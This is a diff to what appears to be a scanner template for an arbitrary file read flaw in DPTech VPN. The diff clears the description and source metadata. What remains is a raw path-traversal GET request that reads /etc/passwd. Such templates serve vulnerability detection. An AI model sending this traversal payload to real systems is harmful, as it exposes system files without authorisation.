@@ -3,12 +3,8 @@ info:
   name: DPTech VPN 任意文件读取
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zlfneyf8pyne377q'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zlfneyf8pyne377q
-    fofa: 暂无
 http:
 - raw:
   - 'GET /..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
